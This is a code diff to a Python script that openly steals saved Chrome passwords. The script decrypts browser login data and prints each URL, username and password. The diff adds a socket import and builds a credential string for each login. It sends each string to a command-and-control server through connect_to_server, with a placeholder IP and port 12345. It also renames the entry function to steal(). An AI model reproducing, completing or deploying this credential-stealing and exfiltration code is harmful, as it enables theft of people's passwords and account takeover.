@@ -13,6 +13,7 @@ from Crypto.Util.Padding import unpad
 from Crypto.Protocol.KDF import PBKDF2
 from win32crypt import CryptUnprotectData
 from ctypes.wintypes import MAX_PATH
+import socket
 
 #===========================#
 # C O L O R S               #
@@ -128,7 +129,11 @@ def decrypt_key(encrypted_key):
 
 def login_data_parser(login_data_path, decryption_key):
 
+    #===========================#
+
     print(f"| [{bcolors.OKGREEN}>{bcolors.ENDC}] Parsing password data.")
+    
+    #===========================#
 
     try:
     
@@ -167,18 +172,26 @@ def login_data_parser(login_data_path, decryption_key):
                 print(f"|  [{bcolors.OKGREEN}>{bcolors.ENDC}] 👤 [{bcolors.WARNING}Username{bcolors.ENDC}]: [{bcolors.OKGREEN}" + username_value + f"{bcolors.ENDC}]")
                 print(f"|  [{bcolors.OKGREEN}>{bcolors.ENDC}] 🔑 [{bcolors.WARNING}Password{bcolors.ENDC}]: [{bcolors.FAIL}" + decrypted_password + f"{bcolors.ENDC}]")
                 print(f"| ----------------------------------")
+                
+                credentialString = origin_url + ":" + username_value + ":" + decrypted_password
+                
+                # Exfiltrate to a command and control server if desired.
+                cncIP = "0.0.0.0"
+                cncPort = 12345
+                connect_to_server(cncIP, cncPort, credentialString)
+                
+                print(f"| ----------------------------------")
         
         conn.close()
         os.remove(temp_login_data_path)
-        return 0
         
     except sqlite3.Error as e:
+    
         print(f"| [{bcolors.FAIL}x{bcolors.ENDC}] SQL error: {e}")
-        return 1
 
 #===========================#
 
-def main():
+def steal():
 
     if os.name == 'nt':
     
@@ -207,4 +220,6 @@ def main():
 #===========================#
 
 if __name__ == "__main__":
-    main()
+
+    # Get the Chrome data.
+    steal()
